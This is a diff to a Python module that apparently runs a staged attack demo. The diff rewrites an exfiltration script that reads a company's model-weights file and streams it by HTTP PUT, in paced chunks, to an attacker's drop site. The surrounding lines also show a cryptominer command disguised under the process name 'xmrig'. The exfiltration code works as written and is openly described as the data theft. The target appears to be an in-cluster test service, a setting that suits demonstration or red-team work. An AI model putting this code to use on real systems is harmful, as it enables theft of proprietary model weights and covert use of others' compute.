@@ -41,13 +41,35 @@ _MINER_CMD = ["bash", "-lc", "exec -a xmrig python -c " + shlex.quote(_MINER_PY)
 
 # The "exfil" script: read the firm's model-weights file and HTTP PUT it to the
 # attacker's drop site. This is the actual data theft.
+#
+# It streams fixed-size chunks with a short pause (~18 s for the ~300 MB file)
+# instead of one big read+PUT, so the drop site's progress lines and the attacker
+# app's bar actually move. Content-Length is still the exact file size, the
+# volume stays read-only (we only ever open the file for reading), and the
+# target is unchanged (config.DROP_SERVICE, in-cluster).
+#
+# The pod prints ONLY the final "sent <n> bytes" line: steps.steal_weights reads
+# the first digit token from these logs as the stolen size, so a per-chunk
+# progress line here would make it report one chunk instead of the whole file.
 _EXFIL_PY = (
-    "import urllib.request, os\n"
+    "import http.client, os, time\n"
+    "from urllib.parse import urlsplit\n"
     f"p = '/weights/{config.WEIGHTS_FILE}'; n = os.path.getsize(p)\n"
-    "d = open(p, 'rb').read()\n"
-    f"r = urllib.request.Request('{config.DROP_SERVICE}', data=d, method='PUT')\n"
-    "r.add_header('Content-Length', str(n))\n"
-    "urllib.request.urlopen(r); print('sent', n, 'bytes', flush=True)\n"
+    f"u = urlsplit('{config.DROP_SERVICE}')\n"
+    "CHUNK = 8 << 20; PAUSE = 0.5\n"
+    "c = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=120)\n"
+    "c.putrequest('PUT', u.path)\n"
+    "c.putheader('Content-Length', str(n))\n"
+    "c.endheaders()\n"
+    "sent = 0\n"
+    "with open(p, 'rb') as f:\n"
+    "    while sent < n:\n"
+    "        chunk = f.read(min(CHUNK, n - sent))\n"
+    "        if not chunk: break\n"
+    "        c.send(chunk); sent += len(chunk)\n"
+    "        time.sleep(PAUSE)\n"
+    "r = c.getresponse(); r.read(); c.close()\n"
+    "print('sent', n, 'bytes', flush=True)\n"
 )
 _EXFIL_CMD = ["python", "-c", _EXFIL_PY]
 
